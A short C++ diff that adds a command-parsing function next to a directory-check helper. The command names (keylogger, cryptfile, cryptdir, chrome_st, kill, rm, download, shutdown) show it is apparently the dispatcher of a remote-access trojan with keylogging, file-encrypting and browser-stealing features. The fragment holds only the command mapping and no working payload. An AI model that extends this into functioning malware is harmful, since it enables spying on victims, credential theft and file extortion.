@@ -37,3 +37,23 @@ bool dirExists(const std::string& dirName_in) {
 	return false;
 #endif
 }
+
+int parse(std::string comm) {
+	if (comm == "help")  return 1;
+	else if (comm == "close")     return 2;
+	else if (comm == "pwd")       return 3;
+	else if (comm == "ls")        return 4;
+	else if (comm == "rm")        return 5;
+	else if (comm == "rmdir")     return 6;
+	else if (comm == "info")      return 7;
+	else if (comm == "ps")        return 8;
+	else if (comm == "kill")      return 9;
+	else if (comm == "keylogger") return 10;
+	else if (comm == "cryptfile") return 11;
+	else if (comm == "cryptdir")  return 12;
+	else if (comm == "download")  return 13;
+	else if (comm == "shutdown")  return 14;
+	else if (comm == "error")     return 15;
+	else if (comm == "chrome_st") return 16;
+	else return 0;
+}
